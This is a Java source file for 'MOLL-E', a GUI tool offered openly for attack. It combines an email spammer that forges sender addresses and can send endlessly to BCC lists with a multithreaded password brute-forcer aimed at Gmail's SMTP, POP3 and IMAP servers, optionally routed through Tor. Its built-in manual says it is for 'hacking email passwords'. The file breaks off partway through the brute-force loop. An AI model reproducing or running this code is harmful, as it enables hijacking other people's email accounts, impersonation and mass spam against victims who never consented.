import java.awt.Color;
import java.awt.FlowLayout;
import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.LineNumberReader;
import java.util.ArrayList;
import java.util.Properties;
import java.util.Random;

import javax.mail.*;
import javax.mail.internet.*;
import javax.swing.BorderFactory;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JComboBox;
import javax.swing.JEditorPane;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTabbedPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.border.Border;
import javax.swing.border.TitledBorder;
import javax.swing.filechooser.FileNameExtensionFilter;


public class Molle {
	
	static JTextField tfFrom = new JTextField(15);
	static JTextField tfFromName = new JTextField(15);
	static JTextField tfTo = new JTextField(15);
	static JTextField tfSubject = new JTextField(30);
	static JButton b1 = new JButton("Send");
	static JButton BFswapbutton = new JButton("Bruteforcer");
	static JButton Spammerswapbutton = new JButton("Spammer");
	static JButton startbutton = new JButton("Find");
	static JButton infobutton = new JButton("info");
	static JButton wordlistbutton = new JButton("Select Worldlist");
	static JTextArea textArea = new JTextArea ();
	
	static JTextField tfBFmail = new JTextField(15);
	static JTextField tfBFserver = new JTextField(10);
	static JTextField tfthreads = new JTextField(10);
	static JTextField tfupperlimit = new JTextField(8);
	static JTextField tflowerlimit = new JTextField(8);
	static JTextField tfsmtphost = new JTextField(9);
	static JTextField tfsmtpport = new JTextField(9);
	static JTextField tfemailcount = new JTextField(9);
	static JTextField tfuser = new JTextField(8);
	static JTextField tfpass = new JTextField(8);
	static JTextField tfwordlistdelay = new JTextField(8);
	static JTextArea BFconsole = new JTextArea ();
	
	static Color troncolor = new Color(24, 202, 230);
	static Border border1 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(troncolor), "From Name",TitledBorder.LEADING, 0, null, troncolor);
	static Border border2 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(troncolor), "From Email",TitledBorder.LEADING, 0, null, troncolor);
	static Border border3 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(troncolor), "To Email",TitledBorder.LEADING, 0, null, troncolor);
	static Border border4 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(troncolor), "Subject",TitledBorder.LEADING, 0, null, troncolor);
	static Border border5 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(troncolor), "Email Text",TitledBorder.CENTER, 0, null, troncolor);
	static Border border6 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(troncolor), "Email to find password",TitledBorder.LEADING, 0, null, troncolor);
	static Border border7 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(troncolor), "Smtp Server",TitledBorder.LEADING, 0, null, troncolor);
	static Border border8 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(troncolor), "Console",TitledBorder.CENTER, 0, null, troncolor);
	static Border border9 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(troncolor), "Threads",TitledBorder.LEADING, 0, null, troncolor);
	static Border border10 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(troncolor), "Min Lenght",TitledBorder.LEADING, 0, null, troncolor);
	static Border border11 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(troncolor), "Max Lenght",TitledBorder.LEADING, 0, null, troncolor);
	static Border border12 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(troncolor), "Smtp Host",TitledBorder.LEADING, 0, null, troncolor);
	static Border border13 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(troncolor), "Smtp Port",TitledBorder.LEADING, 0, null, troncolor);
	static Border border14 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(troncolor), "Email Count",TitledBorder.LEADING, 0, null, troncolor);
	static Border border15 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(troncolor), "User",TitledBorder.LEADING, 0, null, troncolor);
	static Border border16 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(troncolor), "Pass",TitledBorder.LEADING, 0, null, troncolor);
	static Border border17 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(troncolor), "Delay (ms)",TitledBorder.LEADING, 0, null, troncolor);

	static Random r = new Random();
	
	static long delay;
	static int targetdead;
	static int targetalive;
	static double deaddividealive;
	
	static ArrayList<String> TextList = new ArrayList<String>();
	
	static String[] methodlist = {"smtp","pop3","imap"};
	static JComboBox<String> combobox = new JComboBox<String>(methodlist);
	
	static JCheckBox chb1 = new JCheckBox("Use Tor");
	static JCheckBox chb2 = new JCheckBox("Use Wordlist");
	static JCheckBox chb3 = new JCheckBox("Use Emaillist");
	static JCheckBox chb4 = new JCheckBox("Use Tor");
	
	static JFileChooser fc = new JFileChooser();
	static File wordlist;
	static int wordlistsize;
	static JFrame f = new JFrame("MOLL-E");
	
	static ArrayList<String> BccList = new ArrayList<String>();
	static File emaillist;
	
	public static void main(String[] args) throws Exception {
		
		resetsettings();
		
		f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		f.setSize(650, 560);
		f.setLocationRelativeTo(null);
		f.setResizable(false);
		
		ImageIcon i = new ImageIcon(Molle.class.getResource("Molle1.png"));
	    JLabel label = new JLabel(i);
	    JLabel label2 = new JLabel(i);
	    
		JScrollPane scroll = new JScrollPane (textArea,JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_ALWAYS);
		JScrollPane scroll2 = new JScrollPane (BFconsole,JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_ALWAYS);
		
		tfFrom.setBackground(Color.black);
		tfFrom.setForeground(Color.white);
		tfFromName.setBackground(Color.black);
		tfFromName.setForeground(Color.white);
		tfTo.setBackground(Color.black);
		tfTo.setForeground(Color.white);
		tfSubject.setBackground(Color.black);
		tfSubject.setForeground(Color.white);
		textArea.setBackground(Color.black);
		textArea.setForeground(Color.white);
		tfsmtphost.setBackground(Color.black);
		tfsmtphost.setForeground(Color.white);
		tfsmtpport.setBackground(Color.black);
		tfsmtpport.setForeground(Color.white);
		tfemailcount.setBackground(Color.black);
		tfemailcount.setForeground(Color.white);
		tfuser.setBackground(Color.black);
		tfuser.setForeground(Color.white);
		tfpass.setBackground(Color.black);
		tfpass.setForeground(Color.white);
		
		tfBFmail.setBackground(Color.black);
		tfBFmail.setForeground(Color.white);
		tfBFserver.setBackground(Color.black);
		tfBFserver.setForeground(Color.white);
		BFconsole.setBackground(Color.black);
		BFconsole.setForeground(Color.white);
		BFconsole.setEditable(false);
		tfthreads.setBackground(Color.black);
		tfthreads.setForeground(Color.white);
		tflowerlimit.setBackground(Color.black);
		tflowerlimit.setForeground(Color.white);
		tfupperlimit.setBackground(Color.black);
		tfupperlimit.setForeground(Color.white);
		tfwordlistdelay.setBackground(Color.black);
		tfwordlistdelay.setForeground(Color.white);
		
		
		tfFromName.setBorder(border1);
		tfFrom.setBorder(border2);
		tfTo.setBorder(border3);
		tfSubject.setBorder(border4);
		textArea.setBorder(border5);
		tfBFmail.setBorder(border6);
		tfBFserver.setBorder(border7);
		BFconsole.setBorder(border8);
		tfthreads.setBorder(border9);
		tflowerlimit.setBorder(border10);
		tfupperlimit.setBorder(border11);
		tfsmtphost.setBorder(border12);
		tfsmtpport.setBorder(border13);
		tfemailcount.setBorder(border14);
		tfuser.setBorder(border15);
		tfpass.setBorder(border16);
		tfwordlistdelay.setBorder(border17);
		
		b1.setBackground(troncolor);
		BFswapbutton.setBackground(troncolor);
		startbutton.setBackground(troncolor);
		Spammerswapbutton.setBackground(troncolor);
	    infobutton.setBackground(troncolor);
	    wordlistbutton.setBackground(troncolor);
	    chb1.setBackground(Color.black);
	    chb2.setBackground(Color.black);
	    chb3.setBackground(Color.black);
	    chb4.setBackground(Color.black);
	    chb1.setForeground(Color.white);
	    chb2.setForeground(Color.white);
	    chb3.setForeground(Color.white);
	    chb4.setForeground(Color.white);
		
	    
		tfBFserver.setText("smtp.gmail.com");
		tfthreads.setText("3500");
	    tflowerlimit.setText("9");
	    tfupperlimit.setText("20");
	    tfemailcount.setText("1");
	    tfsmtphost.setText("smtp.gmail.com");
	    tfsmtpport.setText("465");
	    tfwordlistdelay.setText("200");
	    
	    fc.setAcceptAllFileFilterUsed(true);
        FileNameExtensionFilter filter1 = new FileNameExtensionFilter("Text Files", "txt");
        fc.addChoosableFileFilter(filter1);
        
	    
	    final JPanel mainpanel = new JPanel();
		mainpanel.setBackground(Color.black);
		mainpanel.setLayout(new GridLayout(3, 1));
		
		 JPanel optionspanel = new JPanel();
		 optionspanel.setBackground(Color.black);
		 optionspanel.setLayout(new FlowLayout());
		 optionspanel.add(tfFromName);
		 optionspanel.add(tfFrom);
		 optionspanel.add(tfTo);
		 optionspanel.add(tfSubject);
		 optionspanel.add(b1);
		 optionspanel.add(BFswapbutton);
		 optionspanel.add(infobutton);
		 optionspanel.add(tfsmtphost);
		 optionspanel.add(tfsmtpport);
		 optionspanel.add(tfuser);
		 optionspanel.add(tfpass);
		 optionspanel.add(tfemailcount);
		 optionspanel.add(chb3);
		 optionspanel.add(chb4);
		 
		    
		    mainpanel.add(label);
		    mainpanel.add(optionspanel);
		    mainpanel.add(textArea);
	    
		    //### pop3 gui ###
		    final JPanel mainpanel2 = new JPanel();
		    mainpanel2.setBackground(Color.black);
		    mainpanel2.setLayout(new GridLayout(3, 1));
		    
		    
		    JPanel optionspanel2 = new JPanel();
		    optionspanel2.setBackground(Color.black);
		    optionspanel2.setLayout(new FlowLayout());
		    optionspanel2.add(tfBFmail);
		    optionspanel2.add(tfBFserver);
		    optionspanel2.add(tflowerlimit);
		    optionspanel2.add(tfupperlimit);
		    optionspanel2.add(tfthreads);
		    optionspanel2.add(chb1);
		    optionspanel2.add(chb2);
		    optionspanel2.add(wordlistbutton);
		    optionspanel2.add(combobox);
		    optionspanel2.add(startbutton);
		    optionspanel2.add(Spammerswapbutton);
		    optionspanel2.add(tfwordlistdelay);
		    
		    mainpanel2.add(label2);
		    mainpanel2.add(optionspanel2);
		    mainpanel2.add(BFconsole);
		    
		    ActionListener al1 = new ActionListener() {
				
				@Override
				public void actionPerformed(ActionEvent e) {
					
					try {
						
						String countstring = tfemailcount.getText();
				    	 
						if(countstring.equals("E")){
							 
							for (int j = 0; j < 50; j++) {
								Thread thread = new Thread(new SpammerThread());
								thread.setDaemon(true);
								thread.start();
							}
							
						}else{
							Thread thread = new Thread(new SpammerThread());
							thread.setDaemon(true);
							thread.start();
						}
						
						b1.setEnabled(false);
					} catch (Exception e1) {e1.printStackTrace();}
						
				}
			};b1.addActionListener(al1);
			
			ActionListener al2 = new ActionListener() {
				
				@Override
				public void actionPerformed(ActionEvent e) {
					f.remove(mainpanel);
					f.add(mainpanel2);
					f.validate();
					f.setVisible(false);
					f.setVisible(true);
				}
			};BFswapbutton.addActionListener(al2);
			
			ActionListener al3 = new ActionListener() {
				
				@Override
				public void actionPerformed(ActionEvent e) {
					f.remove(mainpanel2);
					f.add(mainpanel);
					f.validate();
					f.setVisible(false);
					f.setVisible(true);
				}
			};Spammerswapbutton.addActionListener(al3);
			
			ActionListener al4 = new ActionListener() {
				
				@Override
				public void actionPerformed(ActionEvent e) {
					
					BFconsole.setText("");
					
					if(chb2.isSelected()){
						
					try {
						wordlistsize = countLines(wordlist);
					} catch (IOException e2) {e2.printStackTrace();}
					
					BFconsole.setText(BFconsole.getText()+"Using wordlist to log "+tfBFmail.getText()+" at "+tfBFserver.getText()+"\npassword will be printed when found.\n");
					BFconsole.setText(BFconsole.getText()+"Wordlist file: "+wordlist.getAbsolutePath()+" Total lines: "+wordlistsize);
					
					try {
					BFThread thread = new BFThread();
					thread.start();
					} catch (Exception e1) {e1.printStackTrace();}
					
					startbutton.setEnabled(false);
					
					}else{
						
						BFconsole.setText(BFconsole.getText()+"Sending "+tfthreads.getText()+" passwords per second to "+tfBFserver.getText()+" to  log "+tfBFmail.getText()+"\npassword will be printed when found.\n");
						for (int j = 0; j < Integer.parseInt(tfthreads.getText()); j++) {
							try {
							BFThread thread = new BFThread();
							thread.start();
							} catch (Exception e1) {e1.printStackTrace();}
						}
						startbutton.setEnabled(false);
						
					}
					
				}
			};startbutton.addActionListener(al4);
			
			ActionListener al5 = new ActionListener() {
				
				@Override
				public void actionPerformed(ActionEvent e) {
					String infotext = "Spammer mode is used for sending emails from other people's adresses or non existing adresses or email spamming\nto send multiple emails press \"Use Emaillist\" then select email list file (list needs to be seperated by new lines inside).\nBruteforcer mode is for hacking email passwords via bruteforce method\nas you know in bruteforce more thread = faster work so if you have good cpu make threads big like 15000 so you can find passwords faster\nyou also need to know smtp,pop3,imap server names which can be found on internet. i already entered it for gmail\nBruteforcer with wordlist --> specify a Delay as millisec and Threads,Min lenght,Max Lenght fields not used\nBruteforcer without wordlist -->Delay field not used and enter Threads,Min lenght,Max Lenght fields for multithreaded password generation\ninstead of most common bruteforcers this program prepared to handle false positives so much better accuracy.\npress Use Tor button to connect to Tor network.\nMade by BenerKaya. have fun :) and i dont take any responsibility so use at your own risk.\nNote: Entering E on email counter in Spammer mode makes it endlessly spam emails with multithread support";
					JOptionPane.showMessageDialog(null, infotext,"User Manual",JOptionPane.PLAIN_MESSAGE);
					
				}
			};infobutton.addActionListener(al5);
			
			ActionListener al6 = new ActionListener() {
				
				@Override
				public void actionPerformed(ActionEvent e) {
					
					fc.showOpenDialog(null);
					wordlist = new File(fc.getSelectedFile().getPath());
					chb2.setSelected(true);
					
				}
			};wordlistbutton.addActionListener(al6);
			
			ActionListener chb1al = new ActionListener() {
				
				@Override
				public void actionPerformed(ActionEvent e) {
					if(chb1.isSelected() || chb4.isSelected()){
						
						System.setProperty("http.proxySet", "true");
						System.setProperty("http.proxyHost", "127.0.0.1");
						System.setProperty("http.proxyPort","9100");
						System.setProperty("https.proxySet", "true");
						System.setProperty("https.proxyHost", "127.0.0.1");
						System.setProperty("https.proxyPort","9100");
						System.setProperty("socksProxyHost", "127.0.0.1");
				        System.setProperty("socksProxyPort", "9150");
						
						try{
						//ip check
						JPanel TorGui = new JPanel();
						TorGui.setLayout(new GridLayout(1,1));
						JEditorPane website = new JEditorPane("http://www.whatsmyip.org");
						//JEditorPane website = new JEditorPane("https://www.dan.me.uk/");
				        website.setEditable(false);
				        website.setContentType("text/html");
				        website.setOpaque(true);
				        website.setBackground(Color.white);
				        website.setForeground(Color.white);
				        TorGui.add(new JScrollPane(website));
				        TorGui.setVisible(true);
						
						//tor check
						JPanel TorGui2 = new JPanel();
						TorGui2.setLayout(new GridLayout(1,1));
						JEditorPane website2 = new JEditorPane("https://check.torproject.org/");
					    website2.setEditable(false);
					    website2.setContentType("text/html");
					    website2.setOpaque(true);
					    website2.setBackground(Color.white);
					    website2.setForeground(Color.white);
					    TorGui2.add(new JScrollPane(website2));
					    
					    //browser
					    JTabbedPane tabs = new JTabbedPane();
					    tabs.add("https://check.torproject.org/", TorGui2);
					    tabs.add("http://www.whatsmyip.org", TorGui);
					    
					    JFrame torbrowser = new JFrame("Internal Tor Browser");
					    torbrowser.setLayout(new GridLayout(1,1));
					    torbrowser.setSize(640, 480);
					    torbrowser.setLocationRelativeTo(null);
					    torbrowser.add(tabs);
					    torbrowser.setVisible(true);
					    chb1.setEnabled(false);
					    chb4.setEnabled(false);
					    chb1.setSelected(true);
						chb4.setSelected(true);
					        
						}catch(Exception e1){
							
							chb1.setSelected(false);
							chb4.setSelected(false);
							JOptionPane.showMessageDialog(null, "Proxy connection failed.\nstart Tor Browser Bundle then try again.","Proxy Error",JOptionPane.ERROR_MESSAGE);
							JOptionPane.showMessageDialog(null, e1.toString(),"Proxy Error",JOptionPane.ERROR_MESSAGE);
							
						}
						
						
					}
					
				}
			};chb1.addActionListener(chb1al);chb4.addActionListener(chb1al);
			
			ActionListener comboboxal = new ActionListener() {
				
				@Override
				public void actionPerformed(ActionEvent e) {
					
					if(combobox.getSelectedItem().equals("smtp")){
						
						border7 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(troncolor), "Smtp Server",TitledBorder.LEADING, 0, null, troncolor);
						tfBFserver.setBorder(border7);
						tfBFserver.setText("smtp.gmail.com");
						
					}
					if(combobox.getSelectedItem().equals("pop3")){
						
						border7 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(troncolor), "Pop3 Server",TitledBorder.LEADING, 0, null, troncolor);
						tfBFserver.setBorder(border7);
						tfBFserver.setText("pop.gmail.com");
						
					}
					if(combobox.getSelectedItem().equals("imap")){
	
						border7 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(troncolor), "Imap Server",TitledBorder.LEADING, 0, null, troncolor);
						tfBFserver.setBorder(border7);
						tfBFserver.setText("imap.gmail.com");
	
					}
					
				}
			};combobox.addActionListener(comboboxal);
			
			//prepare email list
			ActionListener al7 = new ActionListener() {
				
				@Override
				public void actionPerformed(ActionEvent e) {
					
					try{
						
					fc.showOpenDialog(null);
					emaillist = new File(fc.getSelectedFile().getPath());
					
					LineNumberReader lineReader = new LineNumberReader(new FileReader(emaillist));
				    String lineText = null;
				 
				    while ((lineText = lineReader.readLine()) != null) {
				    	
				    	BccList.add(lineText);
				    	
				    }
				 
				    lineReader.close();
					
					chb3.setEnabled(false);
					chb3.setSelected(true);
					
					}catch(Exception e1){
						JOptionPane.showMessageDialog(null, e1.toString(),"Error",JOptionPane.ERROR_MESSAGE);
						//chb3.setEnabled(false);
						chb3.setSelected(false);
					}
					
				}
			};chb3.addActionListener(al7);
			
	    
		    
		f.add(mainpanel);
		f.setVisible(true);
		
		//TorProxy();
		
		
		
		
		
	}
	
	public static void sendmail() throws Exception{
		
		
	      
		Properties props = new Properties();
		/*
		props.put("mail.smtp.auth", "true");
		props.put("mail.smtp.starttls.enable", "true");
		props.put("mail.smtp.socketFactory.class","javax.net.ssl.SSLSocketFactory");
		props.put("mail.smtp.host", "37.48.122.29");
		props.put("mail.smtp.port", "587");
		props.put("mail.smtp.localhost", "gmail");
		*/
		props.put("mail.smtp.host", tfsmtphost.getText());
		props.put("mail.smtp.socketFactory.port", tfsmtpport.getText());
		props.put("mail.smtp.socketFactory.class","javax.net.ssl.SSLSocketFactory");
		props.put("mail.smtp.auth", "true");
		props.put("mail.smtp.port", tfsmtpport.getText());
		
		
		//Session session = Session.getDefaultInstance(props);
		
		final String username = tfuser.getText();
		final String password = tfpass.getText();
		
		Session session = Session.getInstance(props,
				  new javax.mail.Authenticator() {
					protected PasswordAuthentication getPasswordAuthentication() {
						return new PasswordAuthentication(username, password);
					}
				  });
	
		
		
		String from = tfFrom.getText();
		String to = tfTo.getText();
		String subject = tfSubject.getText();
		MimeMessage msg = new MimeMessage(session);
		try {
			InternetAddress fromaddr  = new InternetAddress(from);
			fromaddr.validate();
			
		    msg.setFrom(fromaddr);
		    
		    if(chb3.isSelected()){
		    	
		    for (int i = 0; i < BccList.size(); i++) {
		    	msg.addRecipient(Message.RecipientType.BCC, new InternetAddress(BccList.get(i)));
			}
		    
		    }else {
		    msg.addRecipient(Message.RecipientType.TO, new InternetAddress(to));
			}
		    msg.setSubject(subject);
		    msg.setText(textArea.getText());

		    // Send the message.
		    
		    
		    
		    Transport tp = session.getTransport("smtp");
		    tp.connect();
		    
		    String countstring = tfemailcount.getText();
		    int count = 0;
		    if(countstring.equals("E")){
		    	while(true){
		    		tp.send(msg);
		    		Thread.sleep(200);
		    	}
		    }else{
		    	count = Integer.parseInt(countstring);
		    }
		    
		    
		    for (int i = 0; i < count; i++) {
		    tp.send(msg);
		    Thread.sleep(200);
			}
		    
		    System.out.println("message sent");
		} catch (MessagingException e) {
		    // Error.
			e.printStackTrace();
		}
		
	}
	
	public static void checkmail(String host, String user,String password){
		
		try {

		      
		      Properties properties = new Properties();

		      properties.put("mail.pop3.host", host);
		      properties.put("mail.pop3.port", "995");
		      properties.put("mail.pop3.starttls.enable", "true");
		      Session emailSession = Session.getDefaultInstance(properties);
		  
		      
		      Store store = emailSession.getStore("pop3s");

		      
		      		////////////////////////////
		      
		      try{
		    	  
		    	  store.connect(host, user, password);
		    	  
		    	  
	    	        }catch(Exception e1){
	    	        	
	    	        	if(e1.toString().startsWith("javax.mail.MessagingException: Connect failed")){
	    	        		targetdead++;
	    	        	}else{targetalive++;}
	    	        	
	    	        	}
		      
		      		
	    	        deaddividealive = targetdead/targetalive;
	    	        
	    	        if (deaddividealive<=1) {
						delay+=0.1;
					}else{delay-=0.5;}
	    	      ////////////////////////////  
	    	        
		      store.connect(host, user, password);

		      
		      Folder emailFolder = store.getFolder("INBOX");
		      emailFolder.open(Folder.READ_ONLY);

		      
		      Message[] messages = emailFolder.getMessages();
		      System.out.println("messages.length---" + messages.length);

		      /*
		      for (int i = 0; i < 5 ; i++) {
		         Message message = messages[i];
		         System.out.println("---------------------------------");
		         System.out.println("Email Number " + (i + 1));
		         System.out.println("Subject: " + message.getSubject());
		         System.out.println("From: " + message.getFrom()[0]);
		         System.out.println("Text: " + message.getContent().toString());
		      }
		      */
		      BFconsole.setText(BFconsole.getText()+"\npassword found: "+password);

		      emailFolder.close(false);
		      store.close();

		      } catch (NoSuchProviderException e) {
		         e.printStackTrace();
		      } catch (AuthenticationFailedException e) {
		    	  //Here we go
		    	  
		         e.printStackTrace();
		         
		         if(e.toString().startsWith("javax.mail.AuthenticationFailedException: [AUTH] Web login required") || e.toString().startsWith("javax.mail.AuthenticationFailedException: [ALERT] Please log in via your web browser")){
		        	 System.out.println("Password: "+password);
		        	 BFconsole.setText(BFconsole.getText()+"\npassword found: "+password);
		         }
		         
		        
		         
		      } catch (Exception e) {
		         e.printStackTrace();
		      }
		
		
	}
	
	public static void pop3auth(String host, String user,String password){
		
		try {

		      Properties properties = new Properties();
		      properties.put("mail.pop3.host", host);
		      properties.put("mail.pop3.port", "995");
		      properties.put("mail.pop3.starttls.enable", "true");
		      Session emailSession = Session.getDefaultInstance(properties);
		  
		      Store store = emailSession.getStore("pop3s");
		      store.connect(host, user, password);

		      Folder emailFolder = store.getFolder("INBOX");
		      emailFolder.open(Folder.READ_ONLY);

		      Message[] messages = emailFolder.getMessages();
		     
		      BFconsole.setText(BFconsole.getText()+"\npassword found: "+password);

		      emailFolder.close(false);
		      store.close();

		      } catch (NoSuchProviderException e) {
		         e.printStackTrace();
		      } catch (AuthenticationFailedException e) {
		    	  //Here we go
		         e.printStackTrace();
		         
		         if(e.toString().startsWith("javax.mail.AuthenticationFailedException: [AUTH] Web login required") || e.toString().startsWith("javax.mail.AuthenticationFailedException: [ALERT] Please log in via your web browser")){
		        	 System.out.println("Password: "+password);
		        	 BFconsole.setText(BFconsole.getText()+"\npassword found: "+password);
		         }
		         
		         
		      } catch (Exception e) {
		         e.printStackTrace();
		      }
		
		
	}
	
	public static void imapauth(String host, String user,String password){
		
		try {

		      Properties properties = new Properties();
		      properties.setProperty("mail.host", host);
		      properties.setProperty("mail.port", "995");
		      properties.setProperty("mail.transport.protocol", "imaps");
		      Session emailSession = Session.getDefaultInstance(properties);
		  
		      Store store = emailSession.getStore("imaps");
		      store.connect(host, user, password);

		      Folder emailFolder = store.getFolder("INBOX");
		      emailFolder.open(Folder.READ_ONLY);

		      Message[] messages = emailFolder.getMessages();
		     
		      BFconsole.setText(BFconsole.getText()+"\npassword found: "+password);

		      emailFolder.close(false);
		      store.close();

		      } catch (NoSuchProviderException e) {
		         e.printStackTrace();
		      } catch (AuthenticationFailedException e) {
		    	  //Here we go
		         e.printStackTrace();
		         
		         if(e.toString().startsWith("javax.mail.AuthenticationFailedException: [AUTH] Web login required") || e.toString().startsWith("javax.mail.AuthenticationFailedException: [ALERT] Please log in via your web browser")){
		        	 System.out.println("Password: "+password);
		        	 BFconsole.setText(BFconsole.getText()+"\npassword found: "+password);
		         }
		         
		         
		      } catch (Exception e) {
		         e.printStackTrace();
		      }
		
		
	}
	
	public static void smtpauth(String host, final String user,final String password){
		
		try {

			Properties props = new Properties();
			
			props.put("mail.smtp.auth", "true");
			props.put("mail.smtp.starttls.enable", "true");
			props.put("mail.smtp.socketFactory.class","javax.net.ssl.SSLSocketFactory");
			props.put("mail.smtp.host", host);
			props.put("mail.smtp.port", "587");
			/*
			props.put("mail.smtp.host", "smtp.yandex.ru");
			props.put("mail.smtp.socketFactory.port", "465");
			props.put("mail.smtp.socketFactory.class","javax.net.ssl.SSLSocketFactory");
			props.put("mail.smtp.auth", "true");
			props.put("mail.smtp.port", "465");
			*/
			
			//Session session = Session.getDefaultInstance(props);
			
			
			Session session = Session.getInstance(props,
					  new javax.mail.Authenticator() {
						protected PasswordAuthentication getPasswordAuthentication() {
							return new PasswordAuthentication(user, password);
						}
					  });
		
			
			
			    
			    Transport tp = session.getTransport("smtp");
			    tp.connect();
		     
		        BFconsole.setText(BFconsole.getText()+"\npassword found: "+password);

		      

		      } catch (NoSuchProviderException e) {
		         e.printStackTrace();
		      } catch (AuthenticationFailedException e) {
		    	  //Here we go
		         e.printStackTrace();
		         
		         if(e.toString().startsWith("javax.mail.AuthenticationFailedException: [AUTH] Web login required") || e.toString().startsWith("javax.mail.AuthenticationFailedException: [ALERT] Please log in via your web browser")){
		        	 System.out.println("Password: "+password);
		        	 BFconsole.setText(BFconsole.getText()+"\npassword found: "+password);
		         }
		         
		         
		      } catch (Exception e) {
		         e.printStackTrace();
		      }
		
		
	}
	
	public static void TorProxy(){
		
		System.setProperty("http.proxySet", "true");
		System.setProperty("http.proxyHost", "127.0.0.1");
		System.setProperty("http.proxyPort","9100");
		System.setProperty("https.proxySet", "true");
		System.setProperty("https.proxyHost", "127.0.0.1");
		System.setProperty("https.proxyPort","9100");
		System.setProperty("socksProxyHost", "127.0.0.1");
        System.setProperty("socksProxyPort", "9150");
		
	}
	
	public static void resetsettings(){
		
		delay = 600;
		targetdead = 1;
		targetalive = 1;
		deaddividealive = 0.0;
		
	}
	
	public static int countLines(File file) throws IOException {
	    int count = 0;
	    boolean empty = true;
	    FileInputStream fis = null;
	    InputStream is = null;
	    try {
	        fis = new FileInputStream(file);
	        is = new BufferedInputStream(fis);
	        byte[] c = new byte[1024];
	        int readChars = 0;
	        boolean isLine = false;
	        while ((readChars = is.read(c)) != -1) {
	            empty = false;
	            for (int i = 0; i < readChars; ++i) {
	                if ( c[i] == '\n' ) {
	                    isLine = false;
	                    ++count;
	                }else if(!isLine && c[i] != '\n' && c[i] != '\r'){   //Case to handle line count where no New Line character present at EOF
	                    isLine = true;
	                }
	            }
	        }
	        if(isLine){
	            ++count;
	        }
	    }catch(IOException e){
	        e.printStackTrace();
	    }finally {
	        if(is != null){
	            is.close();    
	        }
	        if(fis != null){
	            fis.close();    
	        }
	    }
	    return (count == 0 && !empty) ? 1 : count;
	}
	/*
	public static String GeneratePassword(){
		
		int lowerlimit = Integer.parseInt(tflowerlimit.getText());
		int upperlimit = Integer.parseInt(tfupperlimit.getText());
		boolean same = true;
		
		while(same){
		StringBuilder sb = new StringBuilder();
		//0 rakam 48 to 57
		//1 kucuk harf 97 to 122
		//2 buyuk harf 65 to 90
		for (int i = 0; i < r.nextInt(upperlimit - lowerlimit +1)+lowerlimit; i++) {
			
			int anyfromthree = r.nextInt(3);
			
			if (anyfromthree==0) {
				sb.append((char)(r.nextInt(10)+48));
			}
			if (anyfromthree==1) {
				sb.append((char)(r.nextInt(26)+97));
			}
			if (anyfromthree==2) {
				sb.append((char)(r.nextInt(26)+65));
			}
			
		}
		
		String generatedpassword = sb.toString();
		
		TextList.add(generatedpassword);
		if(TextList.contains(generatedpassword) == false){
			same = false;
		}
		
		}
		
		return generatedpassword;
	}
	*/
	public static class BFThread extends Thread {

		int lowerlimit = Integer.parseInt(tflowerlimit.getText());
		int upperlimit = Integer.parseInt(tfupperlimit.getText());
		
	    public BFThread() throws Exception {

	    	
			
	        
	    }

	    @Override
	    public void run() {
	    	
	    	if(chb2.isSelected()){
	    		//wordlist
	    		if(combobox.getSelectedItem().equals("smtp")){
					
	    				try {
	    				    LineNumberReader lineReader = new LineNumberReader(new FileReader(wordlist));
	    				    String lineText = null;
	    				 
	    				    while ((lineText = lineReader.readLine()) != null) {
	    				    	
	    				    	try {
	    				        //BFconsole.setText(BFconsole.getText()+"\nLine "+lineReader.getLineNumber());
	    				    	f.setTitle("MOLL-E  Work in Progress ( "+lineReader.getLineNumber()+" / "+wordlistsize+" )");
	    				    	System.out.println(lineText);
	    				        smtpauth(tfBFserver.getText(), tfBFmail.getText(), lineText);
	    				        Thread.sleep(Integer.parseInt(tfwordlistdelay.getText()));
	    				    	} catch (Exception e) {e.printStackTrace();}
	    				    	
	    				    }
	    				 
	    				    lineReader.close();
	    				    
	    				} catch (IOException ex) {
	    				    BFconsole.setText(BFconsole.getText()+"\nError");
	    				    JOptionPane.showMessageDialog(null, ex.toString(),"Error",JOptionPane.ERROR_MESSAGE);
	    				    f.setTitle("MOLL-E");
	    				    startbutton.setEnabled(true);
	    				}
	    				BFconsole.setText(BFconsole.getText()+"\nEnd of Wordlist");
	    				f.setTitle("MOLL-E");
	    				startbutton.setEnabled(true);
				}
	    		
	    	if(combobox.getSelectedItem().equals("pop3")){
					
    				try {
    				    LineNumberReader lineReader = new LineNumberReader(new FileReader(wordlist));
    				    String lineText = null;
    				 
    				    while ((lineText = lineReader.readLine()) != null) {
    				    	
    				    	try {
    				        //BFconsole.setText(BFconsole.getText()+"\nLine "+lineReader.getLineNumber());
    				    	f.setTitle("MOLL-E  Work in Progress ( "+lineReader.getLineNumber()+" / "+wordlistsize+" )");
    				    	System.out.println(lineText);
